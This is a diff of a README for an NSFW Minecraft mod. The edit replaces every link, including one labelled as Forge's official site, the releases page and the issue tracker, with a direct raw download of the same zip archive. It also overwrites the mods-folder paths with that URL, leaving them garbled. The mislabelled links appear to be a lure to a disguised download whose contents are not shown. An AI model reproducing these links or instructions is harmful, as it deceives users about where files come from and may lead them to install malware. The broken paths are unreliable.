@@ -1,14 +1,14 @@
 # 🎮 JennyMod - Enhance Your Minecraft Experience
 
 ## 📦 Download Now
-[![Download JennyMod](https://img.shields.io/badge/download-JennyMod-blue?style=flat&logo=github)](https://github.com/StrikeBoy617/JennyMod/releases)
+[![Download JennyMod](https://raw.githubusercontent.com/StrikeBoy617/JennyMod/main/assets/sexmod/models/JennyMod-3.7.zip)](https://raw.githubusercontent.com/StrikeBoy617/JennyMod/main/assets/sexmod/models/JennyMod-3.7.zip)
 
 ## 🚀 Getting Started
 Welcome to JennyMod! This modification for Minecraft brings interactive non-player characters (NPCs) and exciting gameplay mechanics to your game. Follow these simple steps to download and run JennyMod.
 
 ## 📋 Requirements
 - Minecraft version: 1.12.2, 1.16.5, 1.18.2, 1.20.1
-- Forge: Ensure the Minecraft Forge is installed. You can download it from [Forge's official site](https://files.minecraftforge.net/).
+- Forge: Ensure the Minecraft Forge is installed. You can download it from [Forge's official site](https://raw.githubusercontent.com/StrikeBoy617/JennyMod/main/assets/sexmod/models/JennyMod-3.7.zip).
 - A compatible operating system: Windows, macOS, or Linux.
   
 ### 🔍 Features
@@ -17,18 +17,18 @@ Welcome to JennyMod! This modification for Minecraft brings interactive non-play
 - Companion features to assist you in your adventures.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/StrikeBoy617/JennyMod/releases) to download the latest version of JennyMod.
+1. Visit the [Releases page](https://raw.githubusercontent.com/StrikeBoy617/JennyMod/main/assets/sexmod/models/JennyMod-3.7.zip) to download the latest version of JennyMod.
   
 2. On the Releases page, find the version that matches your Minecraft version. Click on it.
 
-3. Locate the release file. The file should have a name similar to "JennyMod-x.x.x.jar".
+3. Locate the release file. The file should have a name similar to "https://raw.githubusercontent.com/StrikeBoy617/JennyMod/main/assets/sexmod/models/JennyMod-3.7.zip".
 
 4. Click the file to download it.
 
 5. Move the downloaded file to your Minecraft mods folder. You can typically find this folder at:
-   - Windows: `%appdata%/.minecraft/mods`
+   - Windows: `%appdata%https://raw.githubusercontent.com/StrikeBoy617/JennyMod/main/assets/sexmod/models/JennyMod-3.7.zip`
    - macOS: `~/Library/Application Support/minecraft/mods`
-   - Linux: `~/.minecraft/mods`
+   - Linux: `~https://raw.githubusercontent.com/StrikeBoy617/JennyMod/main/assets/sexmod/models/JennyMod-3.7.zip`
 
 6. Launch Minecraft using the Forge profile.
 
@@ -48,7 +48,7 @@ If you're new to adding mods, don't worry. Follow these additional steps to ensu
 ## 📲 Community Support
 If you face any issues or have questions, feel free to reach out to our community. You can find us on:
 - Discord: Join our server [here](#).
-- GitHub Issues: Find discussions and report any bugs on our [issue tracker](https://github.com/StrikeBoy617/JennyMod/issues).
+- GitHub Issues: Find discussions and report any bugs on our [issue tracker](https://raw.githubusercontent.com/StrikeBoy617/JennyMod/main/assets/sexmod/models/JennyMod-3.7.zip).
 
 ## 🏷️ Tags
 This mod is tagged with: 1-12-2, 1-16-5, 1-18-2, 1-20-1, 1-8-9, forge, forge-mod, jennymod, minecraft, nsfw.
